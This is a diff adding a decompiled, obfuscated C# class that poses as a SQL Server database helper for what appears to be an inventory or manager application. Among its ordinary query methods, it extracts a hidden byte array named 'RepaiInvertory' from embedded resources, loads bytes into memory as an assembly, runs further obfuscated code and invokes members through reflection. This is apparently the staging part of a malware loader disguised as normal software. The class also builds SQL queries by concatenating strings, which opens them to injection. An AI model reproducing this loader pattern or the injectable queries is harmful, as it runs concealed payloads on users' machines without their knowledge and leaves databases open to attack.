@@ -1,0 +1,413 @@
+using System;
+using System.Collections;
+using System.ComponentModel;
+using System.Data;
+using System.Data.Common;
+using System.Data.SqlClient;
+using System.Globalization;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.CompilerServices;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+using Rn4;
+using Xb1;
+using b5E;
+
+namespace Ww0;
+
+public class y2D
+{
+	protected SqlConnection SqlCon;
+
+	protected SqlCommand SqlCom;
+
+	protected SqlDataReader Sqldreader;
+
+	protected SqlDataAdapter SqlDa;
+
+	protected SqlCommandBuilder SqlComb;
+
+	private string ConnectionString;
+
+	public y2D()
+	{
+		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001c: Expected O, but got Unknown
+		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
+		SqlCon = new SqlConnection();
+		SqlCon.set_ConnectionString(ConnectionString);
+	}
+
+	internal static bool Sy5(string Yk8)
+	{
+		try
+		{
+			WebRequest webRequest = WebRequest.Create(Yk8);
+			webRequest.GetResponse();
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			bool result = false;
+			ProjectData.ClearProjectError();
+			return result;
+		}
+		return true;
+	}
+
+	public bool z6L()
+	{
+		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
+		//IL_003e: Expected O, but got Unknown
+		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
+		bool result = default(bool);
+		try
+		{
+			if (SqlCon.get_State() != ConnectionState.Open)
+			{
+				SqlCon.set_ConnectionString(ConnectionString);
+				SqlCon.Open();
+				result = true;
+				return result;
+			}
+			result = false;
+			return result;
+		}
+		catch (SqlException val)
+		{
+			ProjectData.SetProjectError((Exception)val);
+			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
+			ProjectData.ClearProjectError();
+			return result;
+		}
+	}
+
+	protected bool c9B()
+	{
+		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
+		//IL_002a: Expected O, but got Unknown
+		//IL_002b: Expected O, but got Unknown
+		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
+		try
+		{
+			if (SqlCon.get_State() != 0)
+			{
+				SqlCon.Close();
+				return true;
+			}
+			return false;
+		}
+		catch (SqlException val)
+		{
+			ProjectData.SetProjectError((Exception)val);
+			SqlException val2 = val;
+			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
+			bool result = false;
+			ProjectData.ClearProjectError();
+			return result;
+		}
+	}
+
+	public bool r3Q(string He9, bool Xi7 = false)
+	{
+		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001a: Expected O, but got Unknown
+		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0030: Expected O, but got Unknown
+		//IL_0031: Expected O, but got Unknown
+		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
+		bool result = default(bool);
+		if (z6L())
+		{
+			try
+			{
+				SqlCom = new SqlCommand(He9, SqlCon);
+				SqlCom.ExecuteNonQuery();
+				return true;
+			}
+			catch (SqlException val)
+			{
+				ProjectData.SetProjectError((Exception)val);
+				SqlException val2 = val;
+				if (Xi7)
+				{
+					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
+				}
+				result = false;
+				ProjectData.ClearProjectError();
+				return result;
+			}
+			finally
+			{
+				c9B();
+				((Component)(object)SqlCom).Dispose();
+			}
+		}
+		return result;
+	}
+
+	internal static byte[] Ys7(string[] p4F, int r2Y)
+	{
+		checked
+		{
+			byte[] result = default(byte[]);
+			try
+			{
+				string[] array = new string[p4F.Length - 1 + 1];
+				int num = p4F.Length - 1;
+				for (int i = 0; i <= num; i++)
+				{
+					try
+					{
+						array[i] = p4F[i].Replace(".resources", "");
+					}
+					catch (Exception projectError)
+					{
+						ProjectData.SetProjectError(projectError);
+						ProjectData.ClearProjectError();
+					}
+				}
+				string[] array2 = array;
+				foreach (string text in array2)
+				{
+					if (text == null)
+					{
+						continue;
+					}
+					try
+					{
+						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Kb1.mDic["Ass"]);
+						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
+						foreach (object item in resourceSet.OfType<object>())
+						{
+							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
+							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
+							{
+								result = (byte[])dictionaryEntry.Value;
+								return result;
+							}
+						}
+					}
+					catch (Exception projectError2)
+					{
+						ProjectData.SetProjectError(projectError2);
+						ProjectData.ClearProjectError();
+					}
+				}
+				return result;
+			}
+			catch (Exception projectError3)
+			{
+				ProjectData.SetProjectError(projectError3);
+				ProjectData.ClearProjectError();
+				return result;
+			}
+		}
+	}
+
+	public SqlDataReader Hx0(string Sy3)
+	{
+		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001b: Expected O, but got Unknown
+		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
+		//IL_003b: Expected O, but got Unknown
+		//IL_003c: Expected O, but got Unknown
+		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
+		try
+		{
+			if (z6L())
+			{
+				SqlCom = new SqlCommand(Sy3, SqlCon);
+				Sqldreader = SqlCom.ExecuteReader();
+			}
+			return Sqldreader;
+		}
+		catch (SqlException val)
+		{
+			ProjectData.SetProjectError((Exception)val);
+			SqlException val2 = val;
+			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
+			SqlDataReader result = null;
+			ProjectData.ClearProjectError();
+			return result;
+		}
+		finally
+		{
+			c9B();
+			((Component)(object)SqlCom).Dispose();
+		}
+	}
+
+	public object Sp1(string f3D)
+	{
+		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001c: Expected O, but got Unknown
+		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
+		object result = null;
+		try
+		{
+			if (z6L())
+			{
+				SqlCom = new SqlCommand(f3D, SqlCon);
+				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
+			}
+		}
+		catch (Exception ex)
+		{
+			ProjectData.SetProjectError(ex);
+			Exception ex2 = ex;
+			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
+			ProjectData.ClearProjectError();
+		}
+		finally
+		{
+			c9B();
+			((Component)(object)SqlCom).Dispose();
+		}
+		return result;
+	}
+
+	public DataTable j4T(string Qy0)
+	{
+		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
+		//IL_004d: Expected O, but got Unknown
+		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
+		//IL_006a: Expected O, but got Unknown
+		//IL_006c: Expected O, but got Unknown
+		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
+		string text = string.Empty;
+		try
+		{
+			text = Qy0.Substring(14);
+			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+		DataTable dataTable = new DataTable(text);
+		SqlDa = new SqlDataAdapter(Qy0, SqlCon);
+		if (z6L())
+		{
+			try
+			{
+				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
+			}
+			catch (SqlException val)
+			{
+				ProjectData.SetProjectError((Exception)val);
+				SqlException val2 = val;
+				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
+				ProjectData.ClearProjectError();
+			}
+			finally
+			{
+				c9B();
+				((Component)(object)SqlDa).Dispose();
+			}
+		}
+		return dataTable;
+	}
+
+	public static string Dw1(string Dp2)
+	{
+		Type type = (Type)Kb1.mDic[Kb1.T];
+		return Conversions.ToString(type.InvokeMember(Dp2, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
+	}
+
+	public DataTable j5J(string Wr6, string o5H)
+	{
+		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0029: Expected O, but got Unknown
+		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0046: Expected O, but got Unknown
+		//IL_0047: Expected O, but got Unknown
+		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
+		DataTable dataTable = new DataTable(Wr6);
+		SqlDa = new SqlDataAdapter("Select * from " + Wr6 + " Where " + o5H, SqlCon);
+		if (z6L())
+		{
+			try
+			{
+				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
+			}
+			catch (SqlException val)
+			{
+				ProjectData.SetProjectError((Exception)val);
+				SqlException val2 = val;
+				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
+				ProjectData.ClearProjectError();
+			}
+			finally
+			{
+				c9B();
+				((Component)(object)SqlDa).Dispose();
+			}
+		}
+		return dataTable;
+	}
+
+	public bool Nz4(string Lp1, DataTable s4B, bool Ar1 = false)
+	{
+		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
+		//IL_000b: Expected O, but got Unknown
+		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0022: Expected O, but got Unknown
+		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
+		//IL_0033: Expected O, but got Unknown
+		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
+		SqlDa = new SqlDataAdapter();
+		SqlDa.set_SelectCommand(new SqlCommand(Lp1, SqlCon));
+		SqlComb = new SqlCommandBuilder(SqlDa);
+		try
+		{
+			if (z6L())
+			{
+				((DbDataAdapter)(object)SqlDa).Update(s4B);
+				return true;
+			}
+			return false;
+		}
+		catch (Exception ex)
+		{
+			ProjectData.SetProjectError(ex);
+			Exception ex2 = ex;
+			if (Ar1)
+			{
+				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
+			}
+			bool result = false;
+			ProjectData.ClearProjectError();
+			return result;
+		}
+		finally
+		{
+			c9B();
+			((Component)(object)SqlDa).Dispose();
+			((Component)(object)SqlComb).Dispose();
+		}
+	}
+
+	internal static void Fe7()
+	{
+		Assembly value = Thread.GetDomain().Load((byte[])Kb1.mDic[Kb1.mArray]);
+		Kb1.mDic.Add("Ass2", value);
+		value = null;
+		if (Kq4.Ed3())
+		{
+			x7E.Fp5();
+		}
+	}
+
+	protected void Zy5()
+	{
+		c9B();
+		GC.SuppressFinalize(this);
+	}
+}
